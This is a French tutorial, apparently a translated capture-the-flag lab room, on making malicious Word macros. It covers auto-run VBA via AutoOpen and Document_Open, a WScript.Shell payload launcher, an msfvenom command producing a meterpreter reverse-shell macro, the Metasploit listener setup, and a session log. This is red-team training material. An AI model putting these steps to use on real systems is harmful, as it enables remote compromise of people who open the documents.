Visual Basic pour Application (VBA)
===============================

Visual Basic pour Application (VBA)

VBA signifie Visual Basic pour Applications, un langage de programmation de Microsoft mis en œuvre pour les applications Microsoft telles que Microsoft Word, Excel, PowerPoint, etc. La programmation VBA permet d'automatiser les tâches de presque toutes les interactions clavier et souris entre un utilisateur et les applications Microsoft Office.

Les macros sont des applications Microsoft Office qui contiennent du code intégré écrit dans un langage de programmation connu sous le nom de Visual Basic pour Applications (VBA). Il est utilisé pour créer des fonctions personnalisées pour accélérer les tâches manuelles en créant des processus automatisés. [L'une des fonctionnalités de VBA consiste à accéder à l'interface de programmation d'applications ( API ](https://en.wikipedia.org/wiki/Windows_API)) de Windows  et à d'autres fonctionnalités de bas niveau . Pour plus d'informations sur VBA, rendez-vous [ici](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications) . [](https://en.wikipedia.org/wiki/Windows_API)[](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)

Dans cette tâche, nous discuterons des bases de VBA et de la manière dont l'adversaire utilise des macros pour créer des documents Microsoft malveillants. Pour suivre le contenu de cette tâche, assurez-vous de déployer la machine Windows attachée dans la tâche 2. Lorsqu'elle sera prête, elle sera disponible via un accès dans le navigateur.

Ouvrez maintenant Microsoft Word 2016 à partir du menu Démarrer. Une fois ouverte, nous fermons la fenêtre de la clé de produit car nous l'utiliserons pendant la période d'essai de sept jours.

![2ceed0307819cf06500e6524a5f632d7](https://github.com/dsgsec/Red-Team/assets/82456829/54bdbea9-8024-4e6a-b2f7-a712a8318588)

Ensuite, assurez-vous d'accepter le contrat de licence Microsoft Office qui s'affiche après la fermeture de la fenêtre de la clé de produit.

![feb2f077507c6c242658e76ee88fb544](https://github.com/dsgsec/Red-Team/assets/82456829/bcaf6aa6-70f3-452a-a1cc-18797ce086b1)

Créez maintenant un nouveau document Microsoft vierge pour créer notre première  macro . L'objectif est de discuter des bases du langage et de montrer comment l'exécuter lorsqu'un document Microsoft Word est ouvert. Tout d'abord, nous devons ouvrir Visual Basic Editor en sélectionnant  view →  macros . La fenêtre Macros montre comment créer notre propre macro dans le document. 

![5e12755e9b891865c6ef07e25047060b](https://github.com/dsgsec/Red-Team/assets/82456829/ead6531c-4c08-4e77-ab41-a1cbd1d77f71)

Dans la  section Nom de la macro  , nous choisissons de nommer notre macro  THM . Notez que nous devons  sélectionner parmi les  macros de  la liste Document1  et enfin sélectionner  créer . Ensuite, l'éditeur Microsoft Visual Basic pour Application montre où nous pouvons écrire du code VBA. Essayons d'afficher une boîte de message avec le message suivant :  Welcome to Weaponization Room ! . Nous pouvons le faire en utilisant la  fonction MsgBox  comme suit :

```
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Enfin, exécutez la macro par F5 ou Run → Run Sub/UserForm .

Maintenant, pour exécuter le code VBA automatiquement une fois le document ouvert, nous pouvons utiliser des fonctions intégrées telles que  AutoOpen  et  Document_open . Notez que nous devons spécifier le nom de la fonction qui doit être exécutée une fois le document ouvert, qui dans notre cas est la   fonction THM .

```
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

Il est important de noter que pour que la macro fonctionne, nous devons l'enregistrer au format Macro-Enabled tel que .doc et  docm . Maintenant, enregistrons le fichier en tant que modèle Word 97-2003 où la macro est activée en allant dans Fichier → enregistrer Document1 et enregistrer en tant que type → Document Word 97-2003  et enfin, enregistrer .

![a5e35b7436173da709dae5695c34d4f9](https://github.com/dsgsec/Red-Team/assets/82456829/578fa2e0-b10a-43a0-9b8e-90d24b0d6449)

Fermons le document Word que nous avons enregistré. Si nous rouvrons le fichier du document, Microsoft Word affichera un message de sécurité indiquant que les macros ont été désactivées et nous donnera la possibilité de l'activer. Activons-le et allons de l'avant pour vérifier le résultat.

![e140bfbce59d6cf3e71489dba094adc2](https://github.com/dsgsec/Red-Team/assets/82456829/88f85747-f0b5-432e-815c-868d20783b22)

Une fois que nous avons autorisé  Enable Content , notre macro est exécutée comme indiqué,

![ca228c238732dcdf21139317992a0083](https://github.com/dsgsec/Red-Team/assets/82456829/d8d8ef29-5448-4d84-a0f8-41cb909b1d3d)

Maintenant, éditez le document Word et créez une fonction macro qui exécute un calc.exe  ou tout fichier exécutable comme preuve de concept comme suit,

```
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

Pour expliquer le code en détail, avec  Dim payload As String, nous déclarons la variable de charge utile  sous forme de chaîne à l'aide du mot-clé Dim  . Avec  payload = "calc.exe", nous spécifions le nom de la charge utile et enfin avec  CreateObject("Wscript.Shell").Run payload, nous créons un objet Windows Scripting Host (WSH) et exécutons la charge utile. Notez que si vous souhaitez renommer le nom de la fonction, vous devez également inclure le nom de la fonction dans les  fonctions AutoOpen() et Document_open() .    

Assurez-vous de tester votre code avant d'enregistrer le document en utilisant la fonction d'exécution dans l'éditeur. Assurez-vous de créer les fonctions AutoOpen() et Document_open() avant d'enregistrer le document. Une fois que le code fonctionne, enregistrez maintenant le fichier et essayez de l'ouvrir à nouveau.

![5c80382621d3fcb578a9e128ca821e71](https://github.com/dsgsec/Red-Team/assets/82456829/0f813bbb-9d19-4531-8ab1-4b45e632f00d)

Il est important de mentionner que nous pouvons combiner les VBA avec des méthodes précédemment couvertes, telles que les HTA et les WSH. Les VBA/macros en eux-mêmes ne contournent intrinsèquement aucune détection.

Répondre aux questions ci-dessous

Créons maintenant une charge utile meterpreter en mémoire à l'aide du framework Metasploit pour recevoir un reverse shell. Tout d'abord, à partir de l'AttackBox, nous créons notre charge utile meterpreter en utilisant  msfvenom . Nous devons spécifier  Payload , LHOST et  LPORT , qui correspondent à ce qui se trouve dans le framework Metasploit . Notez que nous spécifions la charge utile en tant que  VBA  pour l'utiliser comme macro.  

Terminal

```
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes

```

La valeur de  LHOST  dans le terminal ci-dessus  est un exemple de l'adresse IP d'AttackBox que nous avons utilisée. Dans votre cas, vous devez spécifier l'adresse IP de votre AttackBox.

Importez de noter qu'une modification doit être effectuée pour que cela fonctionne. La sortie fonctionnera sur une feuille MS Excel. Par conséquent, remplacez  Workbook_Open() par  Document_Open() pour l'adapter aux documents MS Word.  

Copiez maintenant la sortie et enregistrez-la dans l'éditeur de macros du document MS Word, comme nous l'avons montré précédemment.

Depuis la machine attaquante, exécutez le framework Metasploit et configurez l'écouteur comme suit :

Terminal

```
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.159.15:443

```

Une fois le document MS Word malveillant ouvert sur la machine victime, nous devrions recevoir un reverse shell.

Terminal

```
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.159.15:443
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```
